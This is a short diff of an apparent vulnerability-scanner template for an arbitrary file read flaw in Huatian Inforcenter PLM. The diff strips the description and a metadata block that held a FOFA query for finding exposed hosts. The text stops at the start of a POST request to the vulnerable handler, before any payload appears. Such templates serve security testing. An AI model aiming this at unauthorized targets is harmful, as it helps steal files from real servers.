@@ -3,12 +3,8 @@ info:
   name: 华天软件Inforcenter PLM 存在任意文件读取漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/mzwb9bh4871pyifm'
+  description: ''
   tags: rce,lfi,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: mzwb9bh4871pyifm
-    fofa: body="/Base/BaseHandler.ashx"
 http:
 - raw:
   - 'POST /Base/BaseHandler.ashx HTTP/1.1
